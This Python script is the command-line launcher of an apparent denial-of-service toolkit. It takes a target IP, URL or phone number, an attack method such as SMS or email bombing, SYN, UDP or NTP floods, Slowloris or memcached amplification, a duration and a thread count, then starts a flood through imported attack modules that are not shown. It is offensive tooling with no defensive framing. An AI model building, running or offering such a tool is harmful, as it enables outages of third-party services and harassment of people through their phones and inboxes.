#!/usr/bin/env python3
import os
import sys
import argparse

# Ruta al directorio del entorno virtual
venv_dir = "/home/Impulse/venv"

# Agregar el directorio del entorno virtual al principio de sys.path
sys.path.insert(0, os.path.join(venv_dir, 'lib', 'python3.8', 'site-packages'))

# Importar módulos
try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    print(f"Error al importar los módulos necesarios: {err}")
    sys.exit(1)

def main():
    # Parse args
    parser = argparse.ArgumentParser(description="Denial-of-service ToolKit")
    parser.add_argument(
        "--target",
        type=str,
        metavar="<IP:PORT, URL, PHONE>",
        help="Target ip:port, url or phone",
    )
    parser.add_argument(
        "--method",
        type=str,
        metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>",
        help="Attack method",
    )
    parser.add_argument(
        "--time", type=int, default=10, metavar="<time>", help="time in seconds"
    )
    parser.add_argument(
        "--threads", type=int, default=3, metavar="<threads>", help="threads count (1-200)"
    )

    # Get args
    args = parser.parse_args()
    threads = args.threads
    time = args.time
    method = str(args.method).upper()
    target = args.target

    # Print help if necessary
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)

    # Run ddos attack
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()

if __name__ == "__main__":
    main()

